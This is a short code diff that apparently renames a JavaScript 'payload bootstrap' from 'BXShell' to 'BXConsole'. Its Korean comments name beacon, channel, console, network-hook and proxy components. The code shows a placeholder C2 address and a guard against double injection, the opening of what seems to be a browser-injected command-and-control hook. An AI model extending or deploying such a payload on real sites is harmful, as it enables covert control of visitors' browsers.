@@ -1,4 +1,4 @@
-/* BXShell v0.2 — payload bootstrap (비컨 · 채널 · 콘솔 · 앵커 · 네트워크 훅 · 프록시) */
+/* BXConsole v0.2 — payload bootstrap (비컨 · 채널 · 콘솔 · 앵커 · 네트워크 훅 · 프록시) */
 (function () {
   var C2 = "__C2__";
   if (window.__bx_boot) return;                    // 이중 주입 방지
